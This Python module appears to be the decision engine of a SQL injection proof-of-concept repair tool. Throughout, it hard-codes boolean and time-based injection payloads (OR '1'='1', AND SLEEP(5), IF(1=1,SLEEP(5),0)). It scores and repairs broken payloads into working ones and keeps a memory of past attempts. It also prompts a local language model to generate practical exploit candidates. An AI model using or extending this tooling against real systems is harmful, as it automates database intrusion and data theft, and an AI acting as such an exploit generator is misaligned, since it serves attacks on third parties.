from __future__ import annotations

import json
import os
import re
import urllib.request
import multiprocessing as mp
from typing import Any, Dict, Optional, Tuple

from ai_engine.repair_memory import load_repair_memory

OLLAMA_URL = os.environ.get("OLLAMA_URL", "http://127.0.0.1:11434")
OLLAMA_MODEL = os.environ.get("OLLAMA_MODEL", "qwen2.5:1.5b")

OLLAMA_TIMEOUT = float(os.environ.get("OLLAMA_TIMEOUT", "20"))
OLLAMA_HARD_TIMEOUT = float(os.environ.get("OLLAMA_HARD_TIMEOUT", "25"))

ADEXA_NO_AI = os.environ.get("ADEXA_NO_AI", "").strip() not in ("", "0", "false", "False")

ALLOWED_STRATEGIES = {
    "CHANGE_QUOTES",
    "SWITCH_BOOLEAN",
    "SWITCH_TIME",
}


def _post_json(url: str, payload: Dict[str, Any], timeout: float) -> Dict[str, Any]:
    data = json.dumps(payload).encode("utf-8")
    req = urllib.request.Request(
        url,
        data=data,
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    with urllib.request.urlopen(req, timeout=timeout) as resp:
        raw = resp.read().decode("utf-8", errors="ignore")
        return json.loads(raw)


def _extract_json_object(text: str) -> Optional[Dict[str, Any]]:
    try:
        obj = json.loads(text)
        if isinstance(obj, dict):
            return obj
    except Exception:
        pass

    m = re.search(r"\{.*\}", text, flags=re.DOTALL)
    if not m:
        return None

    try:
        obj = json.loads(m.group(0))
        if isinstance(obj, dict):
            return obj
    except Exception:
        return None

    return None


def _recent_attempts(observation: Dict[str, Any]) -> list[Dict[str, Any]]:
    attempts = observation.get("attempt_history") or []
    return attempts[-5:] if isinstance(attempts, list) else []


def _get_allowed_strategies(observation: Dict[str, Any]) -> set[str]:
    constraints = observation.get("constraints") or {}
    allowed = set(constraints.get("allowed_strategies") or [])
    if not allowed:
        allowed = set(ALLOWED_STRATEGIES)
    return allowed


def _best_memory_case(memory_context: list[Dict[str, Any]]) -> Optional[Dict[str, Any]]:
    if not isinstance(memory_context, list) or not memory_context:
        return None

    best = None
    best_score = -1.0
    for case in memory_context:
        try:
            score = float(case.get("score", 0.0))
        except Exception:
            score = 0.0
        if score > best_score:
            best = case
            best_score = score
    return best
    
def _filter_relevant_memory_cases(
    memory_context: list[Dict[str, Any]],
    current_payload: str,
    current_intent: str,
) -> list[Dict[str, Any]]:
    """
    Keep only strong, relevant memory cases.
    Rules:
    - prefer same intent
    - require higher score for unknown intent
    - keep at most the single best memory case
    """
    if not isinstance(memory_context, list) or not memory_context:
        return []

    cur = (current_payload or "").strip().lower()
    filtered = []

    for case in memory_context:
        if not isinstance(case, dict):
            continue

        payload = str(case.get("payload") or "").strip()
        intent = str(case.get("intent") or "unknown").strip()
        strategy_used = str(case.get("strategy_used") or "").strip()

        try:
            score = float(case.get("score", 0.0))
        except Exception:
            score = 0.0

        if not payload or score <= 0:
            continue

        payload_lower = payload.lower()

        # Same exact payload is always relevant
        if payload_lower == cur:
            filtered.append(case)
            continue

        # Strong IF/time memory
        if "if(" in cur and "if(" in payload_lower and score >= 6.0:
            filtered.append(case)
            continue

        # Strong time-family memory
        if current_intent == "time_based" and intent == "time_based" and score >= 6.0:
            filtered.append(case)
            continue

        # Strong boolean-family memory
        if current_intent == "boolean_based" and intent == "boolean_based" and score >= 5.0:
            filtered.append(case)
            continue

        # Quote-repair memory for broken quote style inputs
        if "'" in cur and "'" in payload_lower and strategy_used in ("CHANGE_QUOTES", "SWITCH_BOOLEAN") and score >= 5.0:
            filtered.append(case)
            continue

        # Unknown intent must be very strong before being trusted
        if current_intent == "unknown" and score >= 7.0:
            filtered.append(case)
            continue

    filtered.sort(key=lambda x: float(x.get("score", 0.0) or 0.0), reverse=True)
    return filtered[:1]


def _build_candidate_list(primary: str, strategy: str, has_quote: bool, has_or: bool, looks_if: bool) -> list[str]:
    """
    Emergency fallback only.
    This should not be the main source of candidates anymore.
    Only used when AI fails to provide candidates.
    """
    candidates: list[str] = []

    def add(x: str) -> None:
        x = str(x or "").strip()
        if x and x not in candidates:
            candidates.append(x)

    add(primary)

    if strategy == "SWITCH_TIME":
        if has_quote:
            add("1' AND SLEEP(5) -- -")
            add("1' OR SLEEP(5) -- -")
            if looks_if:
                add("1' AND IF(1=1,SLEEP(5),0) -- -")
        else:
            add("1 AND SLEEP(5)")
            add("1 OR SLEEP(5)")
            if looks_if:
                add("1 AND IF(1=1,SLEEP(5),0)")

    elif strategy == "SWITCH_BOOLEAN":
        if has_quote:
            add("1' OR '1'='1")
            add("1' AND 1=1 -- -")
            add("1' OR 1=1 -- -")
        else:
            add("1 OR 1=1")
            add("1 AND 1=1")
            add("1 OR TRUE")

    elif strategy == "CHANGE_QUOTES":
        add("1' OR '1'='1")
        add("1' AND 1=1 -- -")
        add("1 OR 1=1")
        add("1 AND 1=1")

    return candidates[:5]


def expand_candidates(base_payload: str, strategy: str, current_payload: str = "") -> list[str]:
    """
    Generate a diverse but still simple set of fallback candidates.
    This is the safety net when AI returns too few candidates or malformed output.
    """
    base_payload = str(base_payload or "").strip()
    current_payload = str(current_payload or "").strip()
    seed = base_payload or current_payload
    lower_seed = seed.lower()
    has_quote = "'" in seed or "'" in current_payload
    has_or = bool(re.search(r"or", lower_seed))
    looks_if = "if(" in lower_seed or "if(" in current_payload.lower()

    candidates: list[str] = []

    def add(value: str) -> None:
        value = str(value or "").strip()
        if value and value not in candidates:
            candidates.append(value)

    add(base_payload)
    add(current_payload)

    for item in _build_candidate_list(
        primary=seed,
        strategy=strategy,
        has_quote=has_quote,
        has_or=has_or,
        looks_if=looks_if,
    ):
        add(item)

    if strategy == "SWITCH_BOOLEAN":
        if has_quote:
            add("1' AND '1'='1' -- -")
            add("1' OR 1=1 #")
        else:
            add("1 AND TRUE")
            add("1 OR TRUE")

    elif strategy == "SWITCH_TIME":
        if has_quote:
            add("1' AND SLEEP(3) -- -")
            add("1' AND IF(1=1,SLEEP(5),0) -- -")
        else:
            add("1 AND SLEEP(3)")
            add("1 AND IF(1=1,SLEEP(5),0)")

    elif strategy == "CHANGE_QUOTES":
        if has_quote:
            add("1' OR '1'='1' -- -")
        add("1 OR 1=1")
        add("1' AND 1=1 -- -")

    return candidates[:5]




def _is_structurally_valid_candidate(candidate: str) -> bool:
    c = str(candidate or "").strip()
    if not c:
        return False
    lower = c.lower()
    if re.search(r"\b(and|or)\s*$", lower):
        return False
    if c.endswith("-") and "--" not in c:
        return False
    if c.count("'") % 2 != 0 and "--" not in c and "#" not in c:
        return False
    depth = 0
    for ch in c:
        if ch == "(":
            depth += 1
        elif ch == ")":
            depth -= 1
            if depth < 0:
                return False
    return depth == 0


def _score_candidate_local(
    candidate: str,
    current_payload: str,
    likely_intent: str,
    likely_damage: list[str],
    memory_case: Optional[Dict[str, Any]],
) -> Tuple[float, str]:
    c = (candidate or "").strip()
    cur = (current_payload or "").strip().lower()
    c_lower = c.lower()

    score = 0.0
    reasons: list[str] = []

    if not c:
        return 0.0, "empty candidate"

    if not _is_structurally_valid_candidate(c):
        return -2.0, "structurally invalid candidate"

    cur_has_or = bool(re.search(r"\bor\b", cur))
    cur_has_and = bool(re.search(r"\band\b", cur))
    cand_has_or = bool(re.search(r"\bor\b", c_lower))
    cand_has_and = bool(re.search(r"\band\b", c_lower))
    cur_has_if = "if(" in cur
    cand_has_if = "if(" in c_lower

    score += 1.0
    reasons.append("non-empty candidate")

    if likely_intent == "time_based":
        if "sleep(" in c_lower or "if(" in c_lower:
            score += 2.0
            reasons.append("preserved time-based family")
        else:
            score -= 1.5
            reasons.append("lost time-based family")

    elif likely_intent == "boolean_based":
        if re.search(r"\b(and|or)\b", c_lower) and re.search(r"(=|!=|<>|<|>)", c_lower):
            score += 2.0
            reasons.append("preserved boolean family")

    if cur_has_if:
        if cand_has_if:
            score += 2.0
            reasons.append("kept IF structure")
        elif "sleep(" in c_lower:
            score += 0.8
            reasons.append("kept time probe but simplified IF")

    if "'" in cur and "'" in c:
        score += 1.0
        reasons.append("preserved quoted style")
    if "'" not in cur and "'" not in c:
        score += 1.0
        reasons.append("preserved numeric style")

    if cur_has_or and cand_has_or:
        score += 0.4
        reasons.append("preserved OR operator")
    elif cur_has_or and cand_has_and:
        score -= 0.2
        reasons.append("changed OR to AND")

    if cur_has_and and cand_has_and:
        score += 0.4
        reasons.append("preserved AND operator")
    elif cur_has_and and cand_has_or:
        score -= 0.2
        reasons.append("changed AND to OR")

    generic_set = {
        "1' AND 1=1 -- -",
        "1 OR 1=1",
        "1 AND 1=1",
        "1' AND SLEEP(5) -- -",
    }
    if c in generic_set:
        score -= 0.5
        reasons.append("generic fallback candidate")

    damage_set = set(likely_damage or [])
    if "broken_if_time_syntax" in damage_set or "missing_if_comma" in damage_set:
        if cand_has_if and "sleep(" in c_lower:
            score += 1.5
            reasons.append("repairs malformed IF time syntax")

    if "unbalanced_single_quote" in damage_set and "'" in c:
        score += 0.8
        reasons.append("repairs quote issue")

    if "broken_time_syntax" in damage_set and "sleep(" in c_lower:
        score += 0.8
        reasons.append("repairs time syntax")

    if isinstance(memory_case, dict):
        mem_payload = str(memory_case.get("payload") or "").strip().lower()
        mem_intent = str(memory_case.get("intent") or "")
        if mem_payload and mem_payload == c_lower:
            score += 1.5
            reasons.append("matches best memory case")
        if mem_intent and mem_intent == likely_intent:
            score += 0.5
            reasons.append("aligned with memory intent")

    return score, "; ".join(reasons) if reasons else "basic candidate"


def _heuristic_ranked_candidates(
    current_payload: str,
    likely_intent: str,
    likely_damage: list[str],
    strategy: str,
    base_candidates: list[str],
    memory_case: Optional[Dict[str, Any]],
    attempted_payloads: Optional[set[str]] = None,
) -> Tuple[list[Dict[str, Any]], str]:
    ranked = []
    attempted_payloads = attempted_payloads or set()

    for c in base_candidates:
        if c.strip() in attempted_payloads:
            continue
        score, reason = _score_candidate_local(
            candidate=c,
            current_payload=current_payload,
            likely_intent=likely_intent,
            likely_damage=likely_damage,
            memory_case=memory_case,
        )
        if not _is_structurally_valid_candidate(c):
            continue
        ranked.append({
            "payload": c,
            "score": round(score, 2),
            "reason": reason,
        })

    ranked.sort(key=lambda x: x["score"], reverse=True)
    best_reason = ranked[0]["reason"] if ranked else "no ranked candidates"
    return ranked[:3], best_reason


def _choose_heuristic_decision(observation: Dict[str, Any], reason: str) -> Dict[str, Any]:
    payload = observation.get("payload") or {}
    payload_features = observation.get("payload_features") or {}
    memory_context = observation.get("memory_context") or []

    current = str(payload.get("current_payload_normalized") or payload.get("current_payload_raw") or "").strip()
    allowed = _get_allowed_strategies(observation)
    attempts = _recent_attempts(observation)

    lower = current.lower()
    has_quote = "'" in current
    has_or = bool(re.search(r"\bor\b", lower))
    has_sleep = bool(payload_features.get("contains_sleep"))
    looks_if = "if(" in lower

    likely_damage = list(payload_features.get("likely_damage_types") or ["unknown"])
    likely_intent = str(payload_features.get("likely_intent") or "unknown")

    any_error = any(bool(a.get("error_detected")) for a in attempts)
    any_changed = any(bool(a.get("response_changed")) for a in attempts)
    tried_time = any("sleep(" in str(a.get("payload") or "").lower() for a in attempts)

    consecutive_boolean_no_difference = 0
    for attempt in reversed(attempts):
        if not isinstance(attempt, dict):
            break
        if attempt.get("likely_result") == "no_boolean_difference":
            consecutive_boolean_no_difference += 1
        else:
            break

    best_memory = _best_memory_case(memory_context)
    used_memory_case = best_memory.get("payload") if isinstance(best_memory, dict) else None
    memory_match_reason = None
    if isinstance(best_memory, dict):
        memory_match_reason = (
            f"Matched past {best_memory.get('intent', 'unknown')} repair "
            f"with score {best_memory.get('score', 0)}"
        )

    def pack(
        failure_reason: str,
        strategy: str,
        next_payload: str,
        confidence: float,
        explanation: str,
    ) -> Dict[str, Any]:
        if consecutive_boolean_no_difference >= 2:
            failure_reason = (
                "Repeated boolean probes produced no meaningful response difference."
            )
            explanation = (
                f"Observed {consecutive_boolean_no_difference} consecutive boolean attempts "
                f"with no meaningful response difference. {explanation}"
            )

        base_candidates = expand_candidates(next_payload, strategy, current)
        ranked_candidates, best_reason = _heuristic_ranked_candidates(
            current_payload=current,
            likely_intent=likely_intent,
            likely_damage=likely_damage,
            strategy=strategy,
            base_candidates=base_candidates,
            memory_case=best_memory,
            attempted_payloads={
                str(a.get("payload") or "").strip()
                for a in attempts
                if isinstance(a, dict) and a.get("payload")
            },
        )
        if not ranked_candidates and strategy == "SWITCH_BOOLEAN" and "SWITCH_TIME" in allowed:
            strategy = "SWITCH_TIME"
            next_payload = "1' AND SLEEP(5) -- -" if has_quote else "1 AND SLEEP(5)"
            base_candidates = expand_candidates(next_payload, strategy, current)
            ranked_candidates, best_reason = _heuristic_ranked_candidates(
                current_payload=current,
                likely_intent=likely_intent,
                likely_damage=likely_damage,
                strategy=strategy,
                base_candidates=base_candidates,
                memory_case=best_memory,
                attempted_payloads={
                    str(a.get("payload") or "").strip()
                    for a in attempts
                    if isinstance(a, dict) and a.get("payload")
                },
            )

        chosen = ranked_candidates[0]["payload"] if ranked_candidates else next_payload

        return {
            "analysis": {
                "failure_reason": failure_reason,
                "diagnosis": {
                    "likely_intent": likely_intent,
                    "likely_damage": likely_damage,
                    "recommended_strategy": strategy,
                },
                "used_memory_case": used_memory_case,
                "memory_match_reason": memory_match_reason,
                "next_strategy": strategy,
                "next_payload": chosen,
                "candidates": [x["payload"] for x in ranked_candidates],
                "candidate_scores": ranked_candidates,
                "best_candidate_reason": best_reason,
                "confidence": confidence,
                "explanation": explanation,
            }
        }

    if likely_intent == "time_based" and "SWITCH_TIME" in allowed:
        primary = "1' AND IF(1=1,SLEEP(5),0) -- -" if looks_if and has_quote else (
            "1' AND SLEEP(5) -- -" if has_quote else "1 AND SLEEP(5)"
        )
        return pack(
            "Payload appears time-based and should be repaired within the same family.",
            "SWITCH_TIME",
            primary,
            0.86,
            "I preserved the time-based intent and repaired it into a valid time probe.",
        )

    if (
        ("broken_if_time_syntax" in likely_damage or "missing_if_comma" in likely_damage)
        and "SWITCH_TIME" in allowed
    ):
        primary = "1' AND IF(1=1,SLEEP(5),0) -- -" if has_quote else "1 AND IF(1=1,SLEEP(5),0)"
        return pack(
            "Malformed IF time payload detected.",
            "SWITCH_TIME",
            primary,
            0.88,
            "I repaired the malformed IF time payload into valid SQL syntax.",
        )

    if (
        ("broken_time_syntax" in likely_damage or "unbalanced_parenthesis" in likely_damage or "broken_function_parenthesis" in likely_damage)
        and has_sleep
        and "SWITCH_TIME" in allowed
    ):
        primary = "1' AND SLEEP(5) -- -" if has_quote else "1 AND SLEEP(5)"
        return pack(
            "Malformed time-based payload syntax detected.",
            "SWITCH_TIME",
            primary,
            0.80,
            "Time payload looked incomplete, so I repaired it into a valid time-based probe.",
        )

    if (
        ("unbalanced_single_quote" in likely_damage or current in ("'", '"'))
        and likely_intent != "time_based"
        and "CHANGE_QUOTES" in allowed
    ):
        primary = "1' OR '1'='1" if has_or else "1' AND 1=1 -- -"
        return pack(
            "Quote imbalance suggests a syntax-breaking payload.",
            "CHANGE_QUOTES",
            primary,
            0.78,
            "I repaired the broken quote structure and converted it into a valid quoted boolean payload.",
        )

    if re.search(r"\band\s+1\s*=\s*2\b", lower) and "SWITCH_BOOLEAN" in allowed:
        primary = re.sub(r"\bAND\s+1\s*=\s*2\b", "AND 1=1", current, flags=re.I)
        return pack(
            "Payload is a false boolean condition, so it cannot be the final exploit.",
            "SWITCH_BOOLEAN",
            primary,
            0.84,
            "I converted the false boolean condition into a true one while preserving the numeric style.",
        )

    if re.search(r"\bor\s+1\s*=\s*2\b", lower) and "SWITCH_BOOLEAN" in allowed:
        primary = re.sub(r"\bOR\s+1\s*=\s*2\b", "OR 1=1", current, flags=re.I)
        return pack(
            "Payload is an OR-false condition, so it should be flipped into a true exploit.",
            "SWITCH_BOOLEAN",
            primary,
            0.84,
            "I converted the false OR condition into a true one while preserving the original style.",
        )

    if bool(payload.get("looks_numeric_context")) and re.search(r"^\s*\d+", current) and "SWITCH_BOOLEAN" in allowed:
        primary = "1 OR 1=1" if has_or else "1 AND 1=1"
        return pack(
            "Numeric injection context detected.",
            "SWITCH_BOOLEAN",
            primary,
            0.76,
            "I kept the payload numeric and switched to a simple boolean-true exploit.",
        )

    if bool(payload.get("looks_quoted_context")) and "SWITCH_BOOLEAN" in allowed:
        primary = "1' OR '1'='1" if has_or else "1' AND 1=1 -- -"
        return pack(
            "Quoted injection context detected.",
            "SWITCH_BOOLEAN",
            primary,
            0.74,
            "I kept the payload in quoted SQLi style and switched to a valid boolean exploit.",
        )

    if (
        likely_intent in ("time_based", "unknown")
        and not any_changed
        and not any_error
        and "SWITCH_TIME" in allowed
        and not tried_time
    ):
        primary = "1' AND SLEEP(5) -- -" if has_quote else "1 AND SLEEP(5)"
        return pack(
            "Boolean attempts did not show useful distinction.",
            "SWITCH_TIME",
            primary,
            0.63,
            "I switched to a time-based probe because boolean behavior looked uninformative.",
        )

    strategy = "SWITCH_BOOLEAN" if "SWITCH_BOOLEAN" in allowed else sorted(allowed)[0]
    primary = "1' OR '1'='1" if has_quote else "1 OR 1=1"
    return pack(
        reason,
        strategy,
        primary,
        0.40,
        f"Heuristic fallback selected {strategy}.",
    )


def _call_ollama_diagnose(observation: Dict[str, Any]) -> Dict[str, Any]:
    prompt = (
        "You are the diagnosis engine for a lab-safe SQL injection PoC repair tool.\n"
        "Analyze the broken payload and explain what is likely wrong.\n"
        "Return ONLY valid JSON in this exact format:\n"
        "{"
        "\"diagnosis\":{"
        "\"likely_intent\":\"boolean_based|time_based|union_based|unknown\","
        "\"likely_damage\":[\"<short labels>\"],"
        "\"recommended_strategy\":\"CHANGE_QUOTES|SWITCH_BOOLEAN|SWITCH_TIME\","
        "\"used_memory_case\":\"<payload or null>\","
        "\"memory_match_reason\":\"<short reason>\","
        "\"reason\":\"<short reason>\""
        "}"
        "}\n\n"
        f"Observation:\n{json.dumps(observation, ensure_ascii=False)}\n\n"
        "Rules:\n"
        "- Use payload and payload_features first.\n"
        "- Use response_features and attempt_history as supporting evidence.\n"
        "- Use memory_context as support, not blind copying.\n"
        "- Choose a memory case only if it is genuinely relevant.\n"
        "- Preserve time-based intent when the payload already looks time-based.\n"
        "- Detect malformed IF(...) and broken function syntax when present.\n"
        "- Return JSON only.\n"
    )

    payload = {
        "model": OLLAMA_MODEL,
        "prompt": prompt,
        "stream": False,
        "options": {
            "temperature": 0.0,
            "num_predict": 220,
        },
    }

    resp = _post_json(f"{OLLAMA_URL}/api/generate", payload, timeout=OLLAMA_TIMEOUT)
    text = resp.get("response", "") if isinstance(resp, dict) else ""
    obj = _extract_json_object(text) or {}
    diagnosis = obj.get("diagnosis", {})
    if not isinstance(diagnosis, dict):
        diagnosis = {}
    return {"diagnosis": diagnosis}


def _call_ollama_repair(observation: Dict[str, Any], diagnosis: Dict[str, Any]) -> Dict[str, Any]:
    prompt = (
        "You are the repair engine for a lab-safe SQL injection PoC repair tool.\n"
        "Use the diagnosis, current observation, and memory to choose the best repair.\n"
        "Return ONLY valid JSON in this exact format:\n"
        "{"
        "\"analysis\":{"
        "\"failure_reason\":\"<short reason>\","
        "\"used_memory_case\":\"<payload or null>\","
        "\"memory_match_reason\":\"<short reason>\","
        "\"next_strategy\":\"CHANGE_QUOTES|SWITCH_BOOLEAN|SWITCH_TIME\","
        "\"next_payload\":\"<best payload string>\","
        "\"candidates\":[\"<candidate1>\",\"<candidate2>\",\"<candidate3>\"],"
        "\"candidate_scores\":["
        "{\"payload\":\"<candidate>\",\"score\":<0-1>,\"reason\":\"<why>\"}"
        "],"
        "\"best_candidate_reason\":\"<why best candidate won>\","
        "\"confidence\":<number between 0 and 1>,"
        "\"explanation\":\"<very short explanation>\""
        "}"
        "}\n\n"
        f"Observation:\n{json.dumps(observation, ensure_ascii=False)}\n\n"
        f"Diagnosis:\n{json.dumps(diagnosis, ensure_ascii=False)}\n\n"
        "Rules:\n"
        "- Allowed strategies are only those listed in constraints.allowed_strategies.\n"
        "- Choose exactly one allowed strategy.\n"
        "- Respect diagnosis.recommended_strategy when possible.\n"
        "- Use memory_context only as supporting evidence.\n"
        "- You must generate the candidates yourself instead of relying on templates.\n"
        "- Return at least 3 practical candidates whenever possible.\n"
        "- Candidates should be close repairs of the original payload, not generic defaults unless necessary.\n"
        "- Prefer the closest valid repair, not just the most generic repair.\n"
        "- Preserve family first: time stays time, boolean stays boolean when possible.\n"
        "- If the payload uses IF(...), prefer a valid IF repair over collapsing to plain SLEEP when possible.\n"
        "- Add a score and reason for each candidate.\n"
        "- Make next_payload the highest-ranked candidate.\n"
        "- Return JSON only.\n"
    )

    payload = {
        "model": OLLAMA_MODEL,
        "prompt": prompt,
        "stream": False,
        "options": {
            "temperature": 0.0,
            "num_predict": 360,
        },
    }

    resp = _post_json(f"{OLLAMA_URL}/api/generate", payload, timeout=OLLAMA_TIMEOUT)
    text = resp.get("response", "") if isinstance(resp, dict) else ""
    obj = _extract_json_object(text) or {}
    analysis = obj.get("analysis", {})
    if not isinstance(analysis, dict):
        analysis = {}
    return {"analysis": analysis}


def _run_with_hard_timeout(fn, args: Tuple[Any, ...], hard_timeout: float) -> Tuple[bool, Any]:
    q: mp.Queue = mp.Queue()

    def _worker(queue: mp.Queue, f, f_args):
        try:
            queue.put(("ok", f(*f_args)))
        except Exception as e:
            queue.put(("err", str(e)))

    p = mp.Process(target=_worker, args=(q, fn, args))
    p.daemon = True
    p.start()
    p.join(hard_timeout)

    if p.is_alive():
        p.terminate()
        p.join(1)
        return False, "hard_timeout"

    if q.empty():
        return False, "no_result"

    status, payload = q.get()
    if status == "ok":
        return True, payload
    return False, payload


def analyze_poc(observation: Dict[str, Any]) -> Dict[str, Any]:
    payload = observation.get("payload") or {}
    payload_features = observation.get("payload_features") or {}

    current_payload = str(payload.get("current_payload_normalized") or payload.get("current_payload_raw") or "").strip()
    current_intent = str(payload_features.get("likely_intent") or "unknown")

    raw_memory = load_repair_memory(
        current_payload=current_payload,
        current_intent=current_intent,
        runs_dir="runs",
        limit=5,
    )

    observation["memory_context"] = _filter_relevant_memory_cases(
        raw_memory,
        current_payload=current_payload,
        current_intent=current_intent,
    )

    if ADEXA_NO_AI:
        return _choose_heuristic_decision(observation, "ai_disabled")

    ok_diag, diag_result = _run_with_hard_timeout(
        _call_ollama_diagnose,
        (observation,),
        hard_timeout=OLLAMA_HARD_TIMEOUT,
    )
    if not ok_diag:
        return _choose_heuristic_decision(observation, f"diagnose_failed:{diag_result}")

    diagnosis = (diag_result or {}).get("diagnosis", {})
    if not isinstance(diagnosis, dict):
        return _choose_heuristic_decision(observation, "invalid_diagnosis_object")

    ok_repair, repair_result = _run_with_hard_timeout(
        _call_ollama_repair,
        (observation, diagnosis),
        hard_timeout=OLLAMA_HARD_TIMEOUT,
    )
    if not ok_repair:
        return _choose_heuristic_decision(observation, f"repair_failed:{repair_result}")

    analysis = (repair_result or {}).get("analysis", {})
    if not isinstance(analysis, dict):
        return _choose_heuristic_decision(observation, "invalid_analysis_object")

    failure_reason = str(analysis.get("failure_reason", diagnosis.get("reason", "unknown"))).strip() or "unknown"
    next_strategy = str(analysis.get("next_strategy", "")).strip()
    next_payload = str(analysis.get("next_payload", "")).strip()
    explanation = str(analysis.get("explanation", "AI decision")).strip() or "AI decision"
    used_memory_case = analysis.get("used_memory_case", diagnosis.get("used_memory_case"))
    memory_match_reason = analysis.get("memory_match_reason", diagnosis.get("memory_match_reason"))
    best_candidate_reason = str(analysis.get("best_candidate_reason", "")).strip()

    try:
        confidence = float(analysis.get("confidence", 0.5))
    except Exception:
        confidence = 0.5
    confidence = max(0.0, min(1.0, confidence))

    candidates = analysis.get("candidates", [])
    if not isinstance(candidates, list):
        candidates = []
    candidates = [str(x).strip() for x in candidates if str(x).strip()]

    candidate_scores = analysis.get("candidate_scores", [])
    if not isinstance(candidate_scores, list):
        candidate_scores = []

    normalized_scores = []
    for item in candidate_scores:
        if not isinstance(item, dict):
            continue
        payload_val = str(item.get("payload", "")).strip()
        if not payload_val:
            continue
        try:
            score_val = float(item.get("score", 0.0))
        except Exception:
            score_val = 0.0
        score_val = max(0.0, min(1.0, score_val))
        reason_val = str(item.get("reason", "")).strip() or "candidate scored by AI"
        normalized_scores.append({
            "payload": payload_val,
            "score": score_val,
            "reason": reason_val,
        })

    allowed = _get_allowed_strategies(observation)

    if next_strategy not in ALLOWED_STRATEGIES or next_strategy not in allowed:
        return _choose_heuristic_decision(observation, "invalid_strategy")

    if not next_payload:
        return _choose_heuristic_decision(observation, "empty_payload")

    if next_payload not in candidates:
        candidates = [next_payload] + [c for c in candidates if c != next_payload]

    expanded_candidates = expand_candidates(
        base_payload=next_payload,
        strategy=next_strategy,
        current_payload=current_payload,
    )
    candidates = [str(c).strip() for c in candidates if str(c).strip()]
    for candidate in expanded_candidates:
        if candidate not in candidates and _is_structurally_valid_candidate(candidate):
            candidates.append(candidate)
    candidates = candidates[:5]

    if len(candidates) < 3:
        return _choose_heuristic_decision(observation, "insufficient_candidate_diversity")

    score_map = {item["payload"]: item for item in normalized_scores}
    if not normalized_scores:
        normalized_scores = []

    rescored = []
    base_score = 0.6
    for idx, candidate in enumerate(candidates):
        existing = score_map.get(candidate)
        if existing:
            rescored.append(existing)
            continue
        rescored.append({
            "payload": candidate,
            "score": max(0.0, min(1.0, base_score - (idx * 0.05))),
            "reason": "expanded fallback candidate",
        })
    normalized_scores = rescored[:5]

    return {
        "analysis": {
            "failure_reason": failure_reason,
            "diagnosis": diagnosis,
            "used_memory_case": used_memory_case,
            "memory_match_reason": memory_match_reason,
            "next_strategy": next_strategy,
            "next_payload": next_payload,
            "candidates": candidates,
            "candidate_scores": normalized_scores,
            "best_candidate_reason": best_candidate_reason or "top-ranked candidate selected by AI",
            "confidence": confidence,
            "explanation": explanation,
        }
    }

